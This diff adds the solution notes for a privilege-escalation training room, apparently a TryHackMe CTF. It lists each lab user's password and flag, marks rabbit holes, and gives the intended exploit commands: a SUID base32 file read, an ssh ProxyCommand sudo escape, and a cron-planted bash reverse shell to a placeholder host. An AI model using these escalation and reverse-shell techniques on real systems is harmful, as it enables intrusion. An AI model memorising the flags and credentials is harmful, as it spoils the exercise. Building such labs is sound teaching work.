@@ -1,0 +1,71 @@
+Priv Esc Room
+
+Priv Esc Easy:
+    Creds:
+        user0:password
+        user1:1m_th3_numb3r_0ne
+        user2:S1lv3r_M3d@l_h3Re
+        user3:m@C_0r_w1nD0w$?
+        user4:l1nUx_0bV1ou$Ly
+        root:Br1ng_m3_@_C0Ff3e
+    user1:
+        Rabbit hole: sudo
+            sudo -u user1 /home/user1/hello.out
+        Intended path: SUID base32
+            .password.txt file in /home/user1
+            Exploit cmd:
+                /usr/bin/base32 /home/user1/.password.txt | base32 -d
+                su user1
+        Flag: user1.txt
+            THM{SU1D_F1l3_SysT3m_@cCesS}
+    user2:
+        Rabbit hole: SUID
+            /usr/bin/diff --line-format=%L /dev/null /home/user1/.important.txt
+            user2 flag coulb be accessed but name modified and directory permissions reviewed
+        Intended path:
+            Sudo rule: 
+                (user2) NOPASSWD: /usr/bin/ssh
+            Exploit cmd:
+                sudo -u user2 /usr/bin/ssh -o ProxyCommand=';bash 0<&2 1>&2' x
+        Flag: user2_Fl@g.txt
+            THM{$ud0_1s_D@ngEroU$}
+    user3:
+        Rabbit hole: sudo
+            sudo -u user3 /usr/bin/ssh-keygen
+        Intended path:
+            Cronjob: 
+                cat /home/user2/may_the_force_be_with_you > /home/user3/hello.py
+            Sudo rule: 
+                (user3) NOPASSWD: /home/user3/hello.py
+            Exploit cmd:
+                Create file: may_the_force_be_with_you in home/user2
+                may_the_force_be_with_you contains something like:
+                    #!/bin/bash
+                    bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+                Wait for cronjob
+                Exploit:
+                sudo -u user3 /home/user3/hello.py
+    user4:
+        Rabbit hole: GUID
+            /usr/bin/env
+            Perm: 2770
+            Ownership: root:user3
+        Intended path:
+            Fully interactive shell may be required:
+                user2: sudo -u user3 ssh-keygen (rabbit hole initially)
+            root cronjob: 
+                /usr/share/hello/say_hello.sh
+                    gcc /usr/share/hello/say_hello.c -o /home/user4/say_h$
+                    chown user4:user4 /home/user4/say_hello.out
+                    sudo -u user4 /home/user4/say_hello.out | tee /dev/pts/0 /dev/pts/1 /dev/pts/2
+                Edit /usr/share/hello/say_hello.c:
+                    Put reverse shell in C
+                Set up nc listener:
+                    Wait for cronjob to run
+    root:
+        Intended path: Reverse Engineering SUID
+            Fully interactive shell required (can generate ssh-key for instance)
+            /bin/enigma
+            Program gives 4 numbers: a, b, c and d
+            Program asks a question:
+            Answer with the value of (a + b) * c / d
